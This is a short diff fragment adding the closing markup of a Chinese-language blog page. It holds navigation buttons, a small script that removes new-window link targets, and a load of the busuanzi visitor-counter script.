+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
